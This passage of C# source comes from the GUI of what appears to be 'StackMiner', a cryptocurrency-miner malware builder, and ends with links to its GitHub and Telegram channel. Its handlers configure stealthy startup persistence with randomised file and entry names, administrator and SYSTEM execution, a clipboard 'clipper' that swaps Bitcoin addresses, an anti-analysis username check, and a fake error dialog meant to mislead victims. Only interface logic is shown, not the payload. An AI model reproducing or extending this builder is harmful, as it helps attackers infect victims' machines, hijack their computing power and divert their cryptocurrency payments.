                if (!isProgramData)
                {
                    installPathCache = txtStartupPath.Text;
                }
                txtStartupPath.Items[txtStartupPath.SelectedIndex] = "ProgramData";
                txtStartupPath.Enabled = false;
            }
            else if(isProgramData)
            {
                txtStartupPath.Items[txtStartupPath.SelectedIndex] = installPathCache;
                txtStartupPath.Enabled = chkStartup.Checked;
            }
        }

        private void toggleAdministrator_CheckedChanged(object sender)
        {
            InstallPathCheck();
        }

        private void toggleRunSystem_CheckedChanged(object sender)
        {
            InstallPathCheck();
        }

        private void comboLanguage_SelectedIndexChanged(object sender, EventArgs e)
        {
            TranslateForms();
        }

        private void btnStartupEntryNameRandomize_Click(object sender, EventArgs e)
        {
            txtStartupEntryName.Text = Randomi(8).ToUpper();
        }

        private void btnStartupFileNameRandomize_Click(object sender, EventArgs e)
        {
            txtStartupFileName.Text = $"{Randomi(12)}\\{Randomi(12)}.exe";
        }

        private void chkClipper_CheckedChanged(object sender)
        {
            chkClipper.Text = chkClipper.Checked ? "Enabled" : "Disabled";
            foreach (Control c in tabClipper.Controls)
            {
                if (c is not MephCheckBox && c is not Label)
                {
                    c.Enabled = chkClipper.Checked;
                }
            }
        }

        private void chkAntiUsername_CheckedChanged(object sender)
        {
            txtAntiUsername.Enabled = chkAntiUsername.Checked;
        }

        private void chkFakeError_CheckedChanged(object sender)
        {
            txtFakeErrorText.Enabled = chkFakeError.Checked;
            txtFakeErrorTitle.Enabled = chkFakeError.Checked;
        }

        private void chkClipperBTC_CheckedChanged(object sender)
        {
            txtClipperBTC.Enabled = chkClipperBTC.Checked;
        }

        private void linkStackGithub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/stackrose/StackMiner");
        }

        private void linkTelegram_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://t.me/stackminer");
        }
    }
}